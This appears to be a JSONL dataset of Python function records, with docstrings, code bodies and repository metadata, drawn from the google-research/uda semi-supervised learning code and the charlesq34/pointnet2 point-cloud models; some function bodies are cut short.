{"docstring": "##### Create input function\n", "func_signal": "def train(hparams):\n", "code": "if FLAGS.unsup_ratio == 0:\n  FLAGS.aug_copy = 0\nelse:\n  assert FLAGS.aug_copy > 0, \"Please specify aug_copy\"\nif FLAGS.dev_size != -1:\n  FLAGS.do_train = True\n  FLAGS.do_eval = True\nif FLAGS.do_train:\n  train_input_fn = data.get_input_fn(\n      data_dir=FLAGS.data_dir,\n      split=\"train\",\n      task_name=FLAGS.task_name,\n      sup_size=FLAGS.sup_size,\n      unsup_ratio=FLAGS.unsup_ratio,\n      aug_copy=FLAGS.aug_copy,\n  )\n\nif FLAGS.do_eval:\n  if FLAGS.dev_size != -1:\n    eval_input_fn = data.get_input_fn(\n        data_dir=FLAGS.data_dir,\n        split=\"dev\",\n        task_name=FLAGS.task_name,\n        sup_size=FLAGS.dev_size,\n        unsup_ratio=0,\n        aug_copy=0)\n    eval_size = FLAGS.dev_size\n  else:\n    eval_input_fn = data.get_input_fn(\n        data_dir=FLAGS.data_dir,\n        split=\"test\",\n        task_name=FLAGS.task_name,\n        sup_size=-1,\n        unsup_ratio=0,\n        aug_copy=0)\n    if FLAGS.task_name == \"cifar10\":\n      eval_size = 10000\n    elif FLAGS.task_name == \"svhn\":\n      eval_size = 26032\n    else:\n      assert False, \"You need to specify the size of your test set.\"\n  eval_steps = eval_size // FLAGS.eval_batch_size\n\n##### Get model function\nmodel_fn = get_model_fn(hparams)\nestimator = utils.get_TPU_estimator(FLAGS, model_fn)\n\n#### Training\nif FLAGS.dev_size != -1:\n  tf.logging.info(\"***** Running training and validation *****\")\n  tf.logging.info(\"  Supervised batch size = %d\", FLAGS.train_batch_size)\n  tf.logging.info(\"  Unsupervised batch size = %d\",\n                  FLAGS.train_batch_size * FLAGS.unsup_ratio)\n  tf.logging.info(\"  Num train steps = %d\", FLAGS.train_steps)\n  curr_step = 0\n  while True:\n    if curr_step >= FLAGS.train_steps:\n      break\n    tf.logging.info(\"Current step {}\".format(curr_step))\n    train_step = min(FLAGS.save_steps, FLAGS.train_steps - curr_step)\n    estimator.train(input_fn=train_input_fn, steps=train_step)\n    estimator.evaluate(input_fn=eval_input_fn, steps=eval_steps)\n    curr_step += FLAGS.save_steps\nelse:\n  if FLAGS.do_train:\n    tf.logging.info(\"***** Running training *****\")\n    tf.logging.info(\"  Supervised batch size = %d\", FLAGS.train_batch_size)\n    tf.logging.info(\"  Unsupervised batch size = %d\",\n                    FLAGS.train_batch_size * FLAGS.unsup_ratio)\n    estimator.train(input_fn=train_input_fn, max_steps=FLAGS.train_steps)\n  if FLAGS.do_eval:\n    tf.logging.info(\"***** Running evaluation *****\")\n    results = estimator.evaluate(input_fn=eval_input_fn, steps=eval_steps)\n    tf.logging.info(\">> Results:\")\n    for key in results.keys():\n      tf.logging.info(\"  %s = %s\", key, str(results[key]))\n      results[key] = results[key].item()\n    acc = results[\"eval/classify_accuracy\"]\n    with tf.gfile.Open(\"{}/results.txt\".format(FLAGS.model_dir), \"w\") as ouf:\n      ouf.write(str(acc))", "path": "uda/image/main.py", "commit_date": "2020-02-03 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def apply_gradients(self, grads_and_vars, global_step=None, name=None):\n", "code": "assignments = []\nfor (grad, param) in grads_and_vars:\n  if grad is None or param is None:\n    continue\n\n  param_name = self._get_variable_name(param.name)\n\n  m = tf.get_variable(\n      name=param_name + \"/adam_m\",\n      shape=param.shape.as_list(),\n      dtype=tf.float32,\n      trainable=False,\n      initializer=tf.zeros_initializer())\n  v = tf.get_variable(\n      name=param_name + \"/adam_v\",\n      shape=param.shape.as_list(),\n      dtype=tf.float32,\n      trainable=False,\n      initializer=tf.zeros_initializer())\n\n  # Standard Adam update.\n  next_m = (\n      tf.multiply(self.beta_1, m) + tf.multiply(1.0 - self.beta_1, grad))\n  next_v = (\n      tf.multiply(self.beta_2, v) + tf.multiply(1.0 - self.beta_2,\n                                                tf.square(grad)))\n\n  update = next_m / (tf.sqrt(next_v) + self.epsilon)\n\n  # Just adding the square of the weights to the loss function is *not*\n  # the correct way of using L2 regularization/weight decay with Adam,\n  # since that will interact with the m and v parameters in strange ways.\n  #\n  # Instead we want ot decay the weights in a manner that doesn't interact\n  # with the m/v parameters. This is equivalent to adding the square\n  # of the weights to the loss with plain (non-momentum) SGD.\n  if self._do_use_weight_decay(param_name):\n    update += self.weight_decay_rate * param\n\n  update_with_lr = self.learning_rate * update\n\n  next_param = param - update_with_lr\n\n  assignments.extend(\n      [param.assign(next_param),\n       m.assign(next_m),\n       v.assign(next_v)])\nreturn tf.group(*assignments, name=name)", "path": "uda/text/bert/optimization.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"dump raw examples.\"\"\"\n", "func_signal": "def dump_raw_examples(examples, separate_doc_by_newline):\n", "code": "tf.logging.info(\"dumpping raw examples\")\ntext_path = os.path.join(FLAGS.output_data_dir, \"text.txt\")\nlabel_path = os.path.join(FLAGS.output_data_dir, \"label.txt\")\nwith tf.gfile.Open(text_path, \"w\") as text_ouf:\n  with tf.gfile.Open(label_path, \"w\") as label_ouf:\n    for example in examples:\n      text_a = example.text_a\n      text_b = example.text_b\n      label = example.label\n      text_ouf.write(text_a + \"\\n\")\n      if text_b is not None:\n        text_ouf.write(text_b + \"\\n\")\n      if separate_doc_by_newline:\n        text_ouf.write(\"\\n\")\n      label_ouf.write(label + \"\\n\")\ntf.logging.info(\"finished dumpping raw examples\")", "path": "uda/text/extract_raw_text.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Whether to use L2 weight decay for `param_name`.\"\"\"\n", "func_signal": "def _do_use_weight_decay(self, param_name):\n", "code": "if not self.weight_decay_rate:\n  return False\nif self.exclude_from_weight_decay:\n  for r in self.exclude_from_weight_decay:\n    if re.search(r, param_name) is not None:\n      return False\nreturn True", "path": "uda/text/bert/optimization.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Get the variable name from the tensor name.\"\"\"\n", "func_signal": "def _get_variable_name(self, param_name):\n", "code": "m = re.match(\"^(.*):\\\\d+$\", param_name)\nif m is not None:\n  param_name = m.group(1)\nreturn param_name", "path": "uda/text/bert/optimization.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Constructs the vision model being trained/evaled.\n\nArgs:\n  inputs: input features/images being fed to the image model build built.\n  num_classes: number of output classes being predicted.\n  is_training: is the model training or not.\n  hparams: additional hyperparameters associated with the image model.\n\nReturns:\n  The logits of the image model.\n\"\"\"\n", "func_signal": "def build_model(inputs, num_classes, is_training, update_bn, hparams):\n", "code": "scopes = setup_arg_scopes(is_training)\n\ntry:\n    from contextlib import nested\nexcept ImportError:\n    from contextlib import ExitStack, contextmanager\n\n    @contextmanager\n    def nested(*contexts):\n        with ExitStack() as stack:\n            for ctx in contexts:\n                stack.enter_context(ctx)\n            yield contexts\n\nwith nested(*scopes):\n  if hparams.model_name == \"pyramid_net\":\n    logits = build_shake_drop_model(\n        inputs, num_classes, is_training)\n  elif hparams.model_name == \"wrn\":\n    logits = build_wrn_model(\n        inputs, num_classes, hparams.wrn_size, update_bn)\n  elif hparams.model_name == \"shake_shake\":\n    logits = build_shake_shake_model(\n        inputs, num_classes, hparams, is_training)\n\nreturn logits", "path": "uda/image/main.py", "commit_date": "2020-02-03 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Get unsupervised feature.\"\"\"\n", "func_signal": "def get_unsup_feature_specs():\n", "code": "feature_specs = collections.OrderedDict()\nfeature_specs[\"ori_input_ids\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"ori_input_mask\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"ori_input_type_ids\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"aug_input_ids\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"aug_input_mask\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"aug_input_type_ids\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nreturn feature_specs", "path": "uda/text/utils/proc_data_utils.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"get aug files.\"\"\"\n\n", "func_signal": "def get_aug_files(data_base_path, aug_ops, aug_copy):\n", "code": "sub_policy_list = aug_ops.split(\"+\")\ntotal_data_files = []\nfor sub_policy in sub_policy_list:\n  sub_policy_data_files = []\n  exist_copy_num = {}\n  for copy_dir in tf.gfile.ListDirectory(os.path.join(\n      data_base_path, sub_policy)):\n    copy_num = int(copy_dir.strip(\"/\"))\n    if copy_num >= aug_copy:\n      continue\n    exist_copy_num[copy_num] = 1\n    data_record_path = os.path.join(\n        data_base_path, sub_policy, copy_dir, \"tf_examples.tfrecord*\")\n    data_files = tf.contrib.slim.parallel_reader.get_data_files(\n        data_record_path)\n    sub_policy_data_files += data_files\n  if len(exist_copy_num) < aug_copy * 0.9:\n    tf.logging.info(\"not enough copies for aug op: {:s}\".format(aug_ops))\n    tf.logging.info(\"found files: {:s}\".format(\n        \" \".join(sub_policy_data_files)))\n    tf.logging.info(\"found copy: {:d} / desired copy: {:d}\".format(\n        len(exist_copy_num), aug_copy))\n  assert len(exist_copy_num) > aug_copy * 0.9\n  total_data_files += sub_policy_data_files\nnp.random.shuffle(total_data_files)\nreturn total_data_files", "path": "uda/text/utils/proc_data_utils.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\" pred: BxNxC,\n    label: BxN, \"\"\"\n", "func_signal": "def get_loss(pred, label):\n", "code": "loss = tf.nn.sparse_softmax_cross_entropy_with_logits(logits=pred, labels=label)\nclassify_loss = tf.reduce_mean(loss)\ntf.summary.scalar('classify loss', classify_loss)\ntf.add_to_collection('losses', classify_loss)\nreturn classify_loss", "path": "pointnet2/models/pointnet2_part_seg_msg_one_hot.py", "commit_date": "2018-02-23 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" Shuffle data and labels.\n    Input:\n      data: B,N,... numpy array\n      label: B,... numpy array\n    Return:\n      shuffled data, label and shuffle indices\n\"\"\"\n", "func_signal": "def shuffle_data(data, labels):\n", "code": "idx = np.arange(len(labels))\nnp.random.shuffle(idx)\nreturn data[idx, ...], labels[idx], idx", "path": "pointnet2/modelnet_h5_dataset.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" pred: BxNxC,\n    label: BxN, \n\tsmpw: BxN \"\"\"\n", "func_signal": "def get_loss(pred, label, smpw):\n", "code": "classify_loss = tf.losses.sparse_softmax_cross_entropy(labels=label, logits=pred, weights=smpw)\ntf.summary.scalar('classify loss', classify_loss)\ntf.add_to_collection('losses', classify_loss)\nreturn classify_loss", "path": "pointnet2/models/pointnet2_sem_seg.py", "commit_date": "2018-02-23 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "''' PointNet Feature Propogation (FP) Module\n    Input:                                                                                                      \n        xyz1: (batch_size, ndataset1, 3) TF tensor                                                              \n        xyz2: (batch_size, ndataset2, 3) TF tensor, sparser than xyz1                                           \n        points1: (batch_size, ndataset1, nchannel1) TF tensor                                                   \n        points2: (batch_size, ndataset2, nchannel2) TF tensor\n        mlp: list of int32 -- output size for MLP on each point                                                 \n    Return:\n        new_points: (batch_size, ndataset1, mlp[-1]) TF tensor\n'''\n", "func_signal": "def pointnet_fp_module(xyz1, xyz2, points1, points2, mlp, is_training, bn_decay, scope, bn=True):\n", "code": "with tf.variable_scope(scope) as sc:\n    dist, idx = three_nn(xyz1, xyz2)\n    dist = tf.maximum(dist, 1e-10)\n    norm = tf.reduce_sum((1.0/dist),axis=2,keep_dims=True)\n    norm = tf.tile(norm,[1,1,3])\n    weight = (1.0/dist) / norm\n    interpolated_points = three_interpolate(points2, idx, weight)\n\n    if points1 is not None:\n        new_points1 = tf.concat(axis=2, values=[interpolated_points, points1]) # B,ndataset1,nchannel1+nchannel2\n    else:\n        new_points1 = interpolated_points\n    new_points1 = tf.expand_dims(new_points1, 2)\n    for i, num_out_channel in enumerate(mlp):\n        new_points1 = tf_util.conv2d(new_points1, num_out_channel, [1,1],\n                                     padding='VALID', stride=[1,1],\n                                     bn=bn, is_training=is_training,\n                                     scope='conv_%d'%(i), bn_decay=bn_decay)\n    new_points1 = tf.squeeze(new_points1, [2]) # B,ndataset1,mlp[-1]\n    return new_points1", "path": "pointnet2/utils/pointnet_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\"Helper to create an initialized Variable with weight decay.\n\nNote that the Variable is initialized with a truncated normal distribution.\nA weight decay is added only if one is specified.\n\nArgs:\n  name: name of the variable\n  shape: list of ints\n  stddev: standard deviation of a truncated Gaussian\n  wd: add L2Loss weight decay multiplied by this float. If None, weight\n      decay is not added for this Variable.\n  use_xavier: bool, whether to use xavier initializer\n\nReturns:\n  Variable Tensor\n\"\"\"\n", "func_signal": "def _variable_with_weight_decay(name, shape, stddev, wd, use_xavier=True):\n", "code": "if use_xavier:\n  initializer = tf.contrib.layers.xavier_initializer()\nelse:\n  initializer = tf.truncated_normal_initializer(stddev=stddev)\nvar = _variable_on_cpu(name, shape, initializer)\nif wd is not None:\n  weight_decay = tf.multiply(tf.nn.l2_loss(var), wd, name='weight_loss')\n  tf.add_to_collection('losses', weight_decay)\nreturn var", "path": "pointnet2/utils/tf_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "'''\nInputs:\n    xyz: (batch_size, ndataset, 3) TF tensor\n    points: (batch_size, ndataset, channel) TF tensor, if None will just use xyz as points\n    use_xyz: bool, if True concat XYZ with local point features, otherwise just use point features\nOutputs:\n    new_xyz: (batch_size, 1, 3) as (0,0,0)\n    new_points: (batch_size, 1, ndataset, 3+channel) TF tensor\nNote:\n    Equivalent to sample_and_group with npoint=1, radius=inf, use (0,0,0) as the centroid\n'''\n", "func_signal": "def sample_and_group_all(xyz, points, use_xyz=True):\n", "code": "batch_size = xyz.get_shape()[0].value\nnsample = xyz.get_shape()[1].value\nnew_xyz = tf.constant(np.tile(np.array([0,0,0]).reshape((1,1,3)), (batch_size,1,1)),dtype=tf.float32) # (batch_size, 1, 3)\nidx = tf.constant(np.tile(np.array(range(nsample)).reshape((1,1,nsample)), (batch_size,1,1)))\ngrouped_xyz = tf.reshape(xyz, (batch_size, 1, nsample, 3)) # (batch_size, npoint=1, nsample, 3)\nif points is not None:\n    if use_xyz:\n        new_points = tf.concat([xyz, points], axis=2) # (batch_size, 16, 259)\n    else:\n        new_points = points\n    new_points = tf.expand_dims(new_points, 1) # (batch_size, 1, 16, 259)\nelse:\n    new_points = grouped_xyz\nreturn new_xyz, new_points, idx, grouped_xyz", "path": "pointnet2/utils/pointnet_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "''' reset order of h5 files '''\n", "func_signal": "def reset(self):\n", "code": "self.file_idxs = np.arange(0, len(self.h5_files))\nif self.shuffle: np.random.shuffle(self.file_idxs)\nself.current_data = None\nself.current_label = None\nself.current_file_idx = 0\nself.batch_idx = 0", "path": "pointnet2/modelnet_h5_dataset.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "''' returned dimension may be smaller than self.batch_size '''\n", "func_signal": "def next_batch(self, augment=False):\n", "code": "start_idx = self.batch_idx * self.batch_size\nend_idx = min((self.batch_idx+1) * self.batch_size, len(self.datapath))\nbsize = end_idx - start_idx\nbatch_data = np.zeros((bsize, self.npoints, self.num_channel()))\nbatch_label = np.zeros((bsize), dtype=np.int32)\nfor i in range(bsize):\n    ps,cls = self._get_item(self.idxs[i+start_idx])\n    batch_data[i] = ps\n    batch_label[i] = cls\nself.batch_idx += 1\nif augment: batch_data = self._augment_batch_data(batch_data)\nreturn batch_data, batch_label", "path": "pointnet2/modelnet_dataset.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\"Helper to create a Variable stored on CPU memory.\nArgs:\n  name: name of the variable\n  shape: list of ints\n  initializer: initializer for Variable\nReturns:\n  Variable Tensor\n\"\"\"\n", "func_signal": "def _variable_on_cpu(name, shape, initializer, use_fp16=False):\n", "code": "with tf.device(\"/cpu:0\"):\n  dtype = tf.float16 if use_fp16 else tf.float32\n  var = tf.get_variable(name, shape, initializer=initializer, dtype=dtype)\nreturn var", "path": "pointnet2/utils/tf_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" NOTE: this is older version of the util func. it is deprecated.\nBatch normalization on convolutional maps and beyond...\nRef.: http://stackoverflow.com/questions/33949786/how-could-i-use-batch-normalization-in-tensorflow\n\nArgs:\n    inputs:        Tensor, k-D input ... x C could be BC or BHWC or BDHWC\n    is_training:   boolean tf.Varialbe, true indicates training phase\n    scope:         string, variable scope\n    moments_dims:  a list of ints, indicating dimensions for moments calculation\n    bn_decay:      float or float tensor variable, controling moving average weight\nReturn:\n    normed:        batch-normalized maps\n\"\"\"\n", "func_signal": "def batch_norm_template_unused(inputs, is_training, scope, moments_dims, bn_decay):\n", "code": "with tf.variable_scope(scope) as sc:\n  num_channels = inputs.get_shape()[-1].value\n  beta = _variable_on_cpu(name='beta',shape=[num_channels],\n                          initializer=tf.constant_initializer(0))\n  gamma = _variable_on_cpu(name='gamma',shape=[num_channels],\n                          initializer=tf.constant_initializer(1.0))\n  batch_mean, batch_var = tf.nn.moments(inputs, moments_dims, name='moments')\n  decay = bn_decay if bn_decay is not None else 0.9\n  ema = tf.train.ExponentialMovingAverage(decay=decay)\n  # Operator that maintains moving averages of variables.\n  # Need to set reuse=False, otherwise if reuse, will see moments_1/mean/ExponentialMovingAverage/ does not exist\n  # https://github.com/shekkizh/WassersteinGAN.tensorflow/issues/3\n  with tf.variable_scope(tf.get_variable_scope(), reuse=False):\n      ema_apply_op = tf.cond(is_training,\n                             lambda: ema.apply([batch_mean, batch_var]),\n                             lambda: tf.no_op())\n  \n  # Update moving average and return current batch's avg and var.\n  def mean_var_with_update():\n    with tf.control_dependencies([ema_apply_op]):\n      return tf.identity(batch_mean), tf.identity(batch_var)\n  \n  # ema.average returns the Variable holding the average of var.\n  mean, var = tf.cond(is_training,\n                      mean_var_with_update,\n                      lambda: (ema.average(batch_mean), ema.average(batch_var)))\n  normed = tf.nn.batch_normalization(inputs, mean, var, beta, gamma, 1e-3)\nreturn normed", "path": "pointnet2/utils/tf_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" ops: dict mapping from string to tf ops \"\"\"\n", "func_signal": "def train_one_epoch(sess, ops, train_writer):\n", "code": "is_training = True\n\n# Shuffle train samples\ntrain_idxs = np.arange(0, len(TRAIN_DATASET))\nnp.random.shuffle(train_idxs)\nnum_batches = len(TRAIN_DATASET)/BATCH_SIZE\n\nlog_string(str(datetime.now()))\n\ntotal_correct = 0\ntotal_seen = 0\nloss_sum = 0\nfor batch_idx in range(num_batches):\n    start_idx = batch_idx * BATCH_SIZE\n    end_idx = (batch_idx+1) * BATCH_SIZE\n    batch_data, batch_label, batch_smpw = get_batch_wdp(TRAIN_DATASET, train_idxs, start_idx, end_idx)\n    # Augment batched point clouds by rotation", "path": "pointnet2/scannet/train.py", "commit_date": "2018-07-15 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" Semantic segmentation PointNet, input is BxNx3, output Bxnum_class \"\"\"\n", "func_signal": "def get_model(point_cloud, is_training, num_class, bn_decay=None):\n", "code": "batch_size = point_cloud.get_shape()[0].value\nnum_point = point_cloud.get_shape()[1].value\nend_points = {}\nl0_xyz = point_cloud\nl0_points = None\nend_points['l0_xyz'] = l0_xyz\n\n# Layer 1\nl1_xyz, l1_points, l1_indices = pointnet_sa_module(l0_xyz, l0_points, npoint=1024, radius=0.1, nsample=32, mlp=[32,32,64], mlp2=None, group_all=False, is_training=is_training, bn_decay=bn_decay, scope='layer1')\nl2_xyz, l2_points, l2_indices = pointnet_sa_module(l1_xyz, l1_points, npoint=256, radius=0.2, nsample=32, mlp=[64,64,128], mlp2=None, group_all=False, is_training=is_training, bn_decay=bn_decay, scope='layer2')\nl3_xyz, l3_points, l3_indices = pointnet_sa_module(l2_xyz, l2_points, npoint=64, radius=0.4, nsample=32, mlp=[128,128,256], mlp2=None, group_all=False, is_training=is_training, bn_decay=bn_decay, scope='layer3')\nl4_xyz, l4_points, l4_indices = pointnet_sa_module(l3_xyz, l3_points, npoint=16, radius=0.8, nsample=32, mlp=[256,256,512], mlp2=None, group_all=False, is_training=is_training, bn_decay=bn_decay, scope='layer4')\n\n# Feature Propagation layers\nl3_points = pointnet_fp_module(l3_xyz, l4_xyz, l3_points, l4_points, [256,256], is_training, bn_decay, scope='fa_layer1')\nl2_points = pointnet_fp_module(l2_xyz, l3_xyz, l2_points, l3_points, [256,256], is_training, bn_decay, scope='fa_layer2')\nl1_points = pointnet_fp_module(l1_xyz, l2_xyz, l1_points, l2_points, [256,128], is_training, bn_decay, scope='fa_layer3')\nl0_points = pointnet_fp_module(l0_xyz, l1_xyz, l0_points, l1_points, [128,128,128], is_training, bn_decay, scope='fa_layer4')\n\n# FC layers\nnet = tf_util.conv1d(l0_points, 128, 1, padding='VALID', bn=True, is_training=is_training, scope='fc1', bn_decay=bn_decay)\nend_points['feats'] = net \nnet = tf_util.dropout(net, keep_prob=0.5, is_training=is_training, scope='dp1')\nnet = tf_util.conv1d(net, num_class, 1, padding='VALID', activation_fn=None, scope='fc2')\n\nreturn net, end_points", "path": "pointnet2/models/pointnet2_sem_seg.py", "commit_date": "2018-02-23 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "''' returned dimension may be smaller than self.batch_size '''\n", "func_signal": "def next_batch(self, augment=False):\n", "code": "start_idx = self.batch_idx * self.batch_size\nend_idx = min((self.batch_idx+1) * self.batch_size, self.current_data.shape[0])\nbsize = end_idx - start_idx\nbatch_label = np.zeros((bsize), dtype=np.int32)\ndata_batch = self.current_data[start_idx:end_idx, 0:self.npoints, :].copy()\nlabel_batch = self.current_label[start_idx:end_idx].copy()\nself.batch_idx += 1\nif augment: data_batch = self._augment_batch_data(data_batch)\nreturn data_batch, label_batch", "path": "pointnet2/modelnet_h5_dataset.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" ops: dict mapping from string to tf ops \"\"\"\n", "func_signal": "def eval_one_epoch(sess, ops, test_writer):\n", "code": "global EPOCH_CNT\nis_training = False\ntest_idxs = np.arange(0, len(TEST_DATASET))\nnum_batches = len(TEST_DATASET)/BATCH_SIZE\n\ntotal_correct = 0\ntotal_seen = 0\nloss_sum = 0\ntotal_seen_class = [0 for _ in range(NUM_CLASSES)]\ntotal_correct_class = [0 for _ in range(NUM_CLASSES)]\n\ntotal_correct_vox = 0\ntotal_seen_vox = 0\ntotal_seen_class_vox = [0 for _ in range(NUM_CLASSES)]\ntotal_correct_class_vox = [0 for _ in range(NUM_CLASSES)]\n\nlog_string(str(datetime.now()))\nlog_string('---- EPOCH %03d EVALUATION ----'%(EPOCH_CNT))\n\nlabelweights = np.zeros(21)\nlabelweights_vox = np.zeros(21)\nfor batch_idx in range(num_batches):\n    start_idx = batch_idx * BATCH_SIZE\n    end_idx = (batch_idx+1) * BATCH_SIZE\n    batch_data, batch_label, batch_smpw = get_batch(TEST_DATASET, test_idxs, start_idx, end_idx)", "path": "pointnet2/scannet/train.py", "commit_date": "2018-07-15 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" Classification PointNet, input is BxNx3, output Bx40 \"\"\"\n", "func_signal": "def get_model(point_cloud, cls_label, is_training, bn_decay=None):\n", "code": "batch_size = point_cloud.get_shape()[0].value\nnum_point = point_cloud.get_shape()[1].value\nend_points = {}\nl0_xyz = tf.slice(point_cloud, [0,0,0], [-1,-1,3])\nl0_points = tf.slice(point_cloud, [0,0,3], [-1,-1,3])\n\n# Set abstraction layers\nl1_xyz, l1_points = pointnet_sa_module_msg(l0_xyz, l0_points, 512, [0.1,0.2,0.4], [32,64,128], [[32,32,64], [64,64,128], [64,96,128]], is_training, bn_decay, scope='layer1')\nl2_xyz, l2_points = pointnet_sa_module_msg(l1_xyz, l1_points, 128, [0.4,0.8], [64,128], [[128,128,256],[128,196,256]], is_training, bn_decay, scope='layer2')\nl3_xyz, l3_points, l3_indices = pointnet_sa_module(l2_xyz, l2_points, npoint=None, radius=None, nsample=None, mlp=[256,512,1024], mlp2=None, group_all=True, is_training=is_training, bn_decay=bn_decay, scope='layer3')\n\n# Feature propagation layers\nl2_points = pointnet_fp_module(l2_xyz, l3_xyz, l2_points, l3_points, [256,256], is_training, bn_decay, scope='fa_layer1')\nl1_points = pointnet_fp_module(l1_xyz, l2_xyz, l1_points, l2_points, [256,128], is_training, bn_decay, scope='fa_layer2')\n\ncls_label_one_hot = tf.one_hot(cls_label, depth=NUM_CATEGORIES, on_value=1.0, off_value=0.0)\ncls_label_one_hot = tf.reshape(cls_label_one_hot, [batch_size, 1, NUM_CATEGORIES])\ncls_label_one_hot = tf.tile(cls_label_one_hot, [1,num_point,1])\nl0_points = pointnet_fp_module(l0_xyz, l1_xyz, tf.concat([cls_label_one_hot, l0_xyz, l0_points],axis=-1), l1_points, [128,128], is_training, bn_decay, scope='fp_layer3')\n\n# FC layers\nnet = tf_util.conv1d(l0_points, 128, 1, padding='VALID', bn=True, is_training=is_training, scope='fc1', bn_decay=bn_decay)\nend_points['feats'] = net \nnet = tf_util.dropout(net, keep_prob=0.5, is_training=is_training, scope='dp1')\nnet = tf_util.conv1d(net, 50, 1, padding='VALID', activation_fn=None, scope='fc2')\n\nreturn net, end_points", "path": "pointnet2/models/pointnet2_part_seg_msg_one_hot.py", "commit_date": "2018-02-23 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "''' PointNet Set Abstraction (SA) Module\n    Input:\n        xyz: (batch_size, ndataset, 3) TF tensor\n        points: (batch_size, ndataset, channel) TF tensor\n        npoint: int32 -- #points sampled in farthest point sampling\n        radius: float32 -- search radius in local region\n        nsample: int32 -- how many points in each local region\n        mlp: list of int32 -- output size for MLP on each point\n        mlp2: list of int32 -- output size for MLP on each region\n        group_all: bool -- group all points into one PC if set true, OVERRIDE\n            npoint, radius and nsample settings\n        use_xyz: bool, if True concat XYZ with local point features, otherwise just use point features\n        use_nchw: bool, if True, use NCHW data format for conv2d, which is usually faster than NHWC format\n    Return:\n        new_xyz: (batch_size, npoint, 3) TF tensor\n        new_points: (batch_size, npoint, mlp[-1] or mlp2[-1]) TF tensor\n        idx: (batch_size, npoint, nsample) int32 -- indices for local regions\n'''\n", "func_signal": "def pointnet_sa_module(xyz, points, npoint, radius, nsample, mlp, mlp2, group_all, is_training, bn_decay, scope, bn=True, pooling='max', knn=False, use_xyz=True, use_nchw=False):\n", "code": "data_format = 'NCHW' if use_nchw else 'NHWC'\nwith tf.variable_scope(scope) as sc:\n    # Sample and Grouping\n    if group_all:\n        nsample = xyz.get_shape()[1].value\n        new_xyz, new_points, idx, grouped_xyz = sample_and_group_all(xyz, points, use_xyz)\n    else:\n        new_xyz, new_points, idx, grouped_xyz = sample_and_group(npoint, radius, nsample, xyz, points, knn, use_xyz)\n\n    # Point Feature Embedding\n    if use_nchw: new_points = tf.transpose(new_points, [0,3,1,2])\n    for i, num_out_channel in enumerate(mlp):\n        new_points = tf_util.conv2d(new_points, num_out_channel, [1,1],\n                                    padding='VALID', stride=[1,1],\n                                    bn=bn, is_training=is_training,\n                                    scope='conv%d'%(i), bn_decay=bn_decay,\n                                    data_format=data_format) \n    if use_nchw: new_points = tf.transpose(new_points, [0,2,3,1])\n\n    # Pooling in Local Regions\n    if pooling=='max':\n        new_points = tf.reduce_max(new_points, axis=[2], keep_dims=True, name='maxpool')\n    elif pooling=='avg':\n        new_points = tf.reduce_mean(new_points, axis=[2], keep_dims=True, name='avgpool')\n    elif pooling=='weighted_avg':\n        with 